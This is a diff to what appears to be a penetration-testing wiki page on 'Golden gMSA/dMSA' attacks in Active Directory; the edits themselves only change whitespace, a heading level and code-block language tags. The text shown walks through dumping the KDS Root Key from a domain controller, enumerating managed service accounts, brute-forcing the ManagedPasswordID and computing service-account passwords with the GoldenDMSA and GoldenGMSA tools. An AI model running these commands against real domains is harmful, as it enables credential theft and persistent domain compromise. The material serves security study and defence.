@@ -10,7 +10,7 @@ There are two major flavours:
 1. **gMSA** – group Managed Service Account – can be used on multiple hosts that are authorised in its `msDS-GroupMSAMembership` attribute.
 2. **dMSA** – delegated Managed Service Account – the (preview) successor to gMSA, relying on the same cryptography but allowing more granular delegation scenarios.
 
-For both variants the **password is not stored** on each Domain Controller (DC) like a regular NT-hash.  Instead every DC can **derive** the current password on-the-fly from:
+For both variants the **password is not stored** on each Domain Controller (DC) like a regular NT-hash. Instead every DC can **derive** the current password on-the-fly from:
 
 * The forest-wide **KDS Root Key** (`KRBTGT\KDS`)  – randomly generated GUID-named secret, replicated to every DC under the `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container.
 * The target account **SID**.
@@ -35,7 +35,7 @@ This is analogous to a *Golden Ticket* for service accounts.
 3. .NET ≥ 4.7.2 x64 workstation to run [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) or equivalent code.
 
 ### Golden gMSA / dMSA
-##### Phase 1 – Extract the KDS Root Key
+#### Phase 1 – Extract the KDS Root Key
 
 Dump from any DC (Volume Shadow Copy / raw SAM+SECURITY hives or remote secrets):
 
@@ -60,7 +60,7 @@ The base64 string labelled `RootKey` (GUID name) is required in later steps.
 
 Retrieve at least `sAMAccountName`, `objectSid` and `msDS-ManagedPasswordId`:
 
-```powershell
+```bash
 # Authenticated or anonymous depending on ACLs
 Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
   Select sAMAccountName,objectSid,msDS-ManagedPasswordId
@@ -70,7 +70,7 @@ GoldenGMSA.exe gmsainfo
 
 [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implements helper modes:
 
-```powershell
+```bash
 # LDAP enumeration (kerberos / simple bind)
 GoldendMSA.exe info -d example.local -m ldap
 
@@ -88,7 +88,7 @@ Because the GUID is 128-bit, naive bruteforce is infeasible, but:
 
 Therefore a **narrow wordlist per account** (± few hours) is realistic.
 
-```powershell
+```bash
 GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
 ```
 The tool computes candidate passwords and compares their base64 blob against the real `msDS-ManagedPassword` attribute – the match reveals the correct GUID.
@@ -97,7 +97,7 @@ The tool computes candidate passwords and compares their base64 blob against the
 
 Once the ManagedPasswordID is known, the valid password is one command away:
 
-```powershell
+```bash
 # derive base64 password
 GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
 GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
